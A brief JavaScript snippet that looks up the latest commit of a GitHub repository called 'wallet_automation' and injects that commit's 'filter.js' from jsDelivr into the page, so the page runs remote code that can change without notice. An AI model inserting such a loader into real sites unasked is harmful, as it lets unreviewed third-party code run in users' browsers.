fetch('https://api.github.com/repos/Sumandey7689/wallet_automation/commits/main')
.then(r => r.json())
.then(d => {
  var s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/gh/Sumandey7689/wallet_automation@' + d.sha + '/filter.js';
  document.body.appendChild(s);
});
